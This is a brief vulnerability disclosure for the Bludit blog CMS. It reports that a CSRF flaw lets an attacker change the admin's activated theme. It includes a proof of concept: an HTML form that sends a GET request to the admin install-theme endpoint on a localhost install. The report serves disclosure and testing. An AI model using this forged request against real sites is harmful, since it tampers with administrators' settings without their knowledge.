# Description
The latest version of Bludit is vulnerable to a CSRF attack which allows a user to change the Activated Theme by sending a precrafted code to to the Admin
# POC
1:Download Bludit from https://github.com/bludit/bludit
2:Extract the zipfile to an Apache Server  
3:Enter the required Details and Login as Admin
Save the below Code as HTML
```
<form method="GET" action="http://localhost/bludit-master/admin/install-theme/alternative">
<input type="submit" >
</form>
```
There are two default Themes which are `Alternative` and `BlogX` 
if the admin clicks the submit button when the them BlogX is activated then the activated theme changes
